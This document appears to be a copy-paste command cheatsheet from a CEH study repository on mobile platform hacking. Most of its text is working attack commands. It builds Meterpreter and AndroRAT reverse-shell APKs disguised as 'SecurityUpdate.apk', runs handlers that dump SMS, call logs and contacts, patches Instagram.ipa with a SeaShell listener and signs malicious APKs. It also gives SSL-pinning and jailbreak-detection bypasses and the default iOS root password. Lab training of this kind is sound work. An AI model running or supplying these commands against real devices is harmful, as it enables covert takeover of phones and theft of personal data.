# 📋 Command Cheatsheet — CEH Module 17: Hacking Mobile Platforms

Every command that appears across this repository, grouped by tool, for fast copy‑paste reference. Full context and explanation for each lives in the numbered module files (linked per section).

> Run all of this only in your own lab (see `README.md → Suggested Lab Setup`).

---

## ADB (Android Debug Bridge)
*Full context: `03-hacking-android-devices.md §3.6, §3.10`*

```bash
# Connect to a device exposing ADB over TCP (e.g., port 5555 left open)
adb connect 10.10.1.14:5555
adb devices
adb shell

# Switch a USB-connected device to TCP mode, then go wireless
adb tcpip 5555
adb connect <device_ip_address>
adb devices
adb shell

# Enumerate installed apps
adb shell pm list packages
adb shell pm list packages -3 -f      # third-party apps only, with APK paths

# Pull a captured pcap off the device (e.g., from PCAPdroid)
adb pull /sdcard/Download/pcapdroid_*.pcap ./

# Capture device logs
adb logcat > logcat.log

# Install / uninstall
adb install SecurityUpdate.apk
adb uninstall <package_name>
```

## drozer
*Full context: `03-hacking-android-devices.md §3.1`*

```bash
# Setup
pip3 install drozer --break-system-packages
adb forward tcp:31415 tcp:31415
drozer console connect
```
```text
dz> run app.package.list
dz> run app.package.list -f <string_name>
dz> run app.package.info -a <package_name>
dz> run app.package.attacksurface <package_name>
dz> run app.activity.info -a <package_name>
dz> run app.activity.start --component <package_name> <activity_name>
```

## Metasploit / msfvenom
*Full context: `03-hacking-android-devices.md §3.9`*

```bash
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik \
  LHOST=10.10.1.13 R > Desktop/Backdoor.apk
```
```text
msf > search type:exploit platform:android
msf > search type:payload platform:android
msf > use exploit/multi/handler
msf > set PAYLOAD android/meterpreter/reverse_tcp
msf > set LHOST 10.10.1.13
msf > set LPORT 4444
msf > exploit
```
```text
meterpreter > sysinfo
meterpreter > ipconfig
meterpreter > pwd
meterpreter > ps
meterpreter > dump_sms
meterpreter > dump_calllog
meterpreter > dump_contacts
meterpreter > webcam_list
```

## Frida
*Full context: `03-hacking-android-devices.md §3.11`, `07-hacking-ios-devices.md §7.7`*

```bash
# List installed apps on a connected device (Android or iOS)
frida-ps -Uai          # -a: all apps  -i: installed  -U: over USB

# Hook a JS script into an app at launch
frida -U -l <Hooking_file.js> -f <package_name_or_bundle_id>
```

## objection (iOS runtime analysis)
*Full context: `07-hacking-ios-devices.md §7.6`*

```bash
objection --gadget <AppName> explore

ios hooking watch class <Class_Name>
ios hooking watch method "-[ClassName Method_Name]"
ios hooking set return value "-[ClassName Function_Name:]" true

ios sslpinning disable
ios jailbreak disable
```

## Apktool
*Full context: `03-hacking-android-devices.md §3.10–3.11`, `10-mobile-security-guidelines-and-tools.md §10.9`*

```bash
apktool d <application_name.apk>      # decompile
apktool b <application_directory>     # rebuild
apktool d test.apk && tree            # decompile + inspect unpacked structure
```

## Signing a (Modified) APK
*Full context: `03-hacking-android-devices.md §3.10`*

```bash
keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey \
  -keyalg RSA -keysize 2048 -validity 20000

apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious_file>.apk
```

## On‑Device Recon (Android, rooted shell)
*Full context: `03-hacking-android-devices.md §3.10`*

```bash
lsof -p <pid>
netstat -p | grep <pid>
```

## AndroRAT
*Full context: `04-android-malware-and-tools.md §4.2`*

```bash
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
adb install SecurityUpdate.apk
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
```

## SeaShell Framework (iOS)
*Full context: `07-hacking-ios-devices.md §7.3`*

```text
seashell
(seashell)> ipa patch Instagram.ipa
(seashell)> ipa build
(seashell)> listener on 192.168.2.116 8888
(seashell)> devices -i <id>
(seashell)> help
(seashell)> safari_history
```

## iOS Device Access & Analysis
*Full context: `07-hacking-ios-devices.md §7.7`*

```bash
# SSH over Wi-Fi (jailbroken device, OpenSSH installed)
ssh root@<device_ip_address>          # default password for root/mobile: alpine

# SSH over USB via usbmuxd
iproxy 2222 22
ssh -p 2222 root@localhost

# Network sniffing via a virtual remote interface + Wireshark
rvictl -s <UDID_of_the_iOS_device>
#   then open Wireshark, interface "rvi0", capture filter e.g.:
#   ip.addr == 192.168.2.4 && http

# Open connections
lsof -i
lsof -i -a -p <pid>

# Process/memory exploration
r2 frida://usb//iGoat-Swift
:dm
:il
\e~search
```

## Cycript (iOS runtime manipulation)
*Full context: `07-hacking-ios-devices.md §7.4`*

```text
cy# a
cy# [a objectAtIndex:0]
cy# [a setObject:@"value" atIndex:0]
cy# o.field
cy# [o setObject:a forKey:@"field"]
```

## MobSF (Docker)
*Full context: `05-securing-android-devices.md §5.5`*

```bash
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
```

## Lab Tooling Install (one‑time setup)
*Full context: `README.md → Suggested Lab Setup`*

```bash
sudo apt update && sudo apt install -y android-tools-adb android-tools-fastboot apktool
pip3 install frida-tools objection drozer --break-system-packages
```
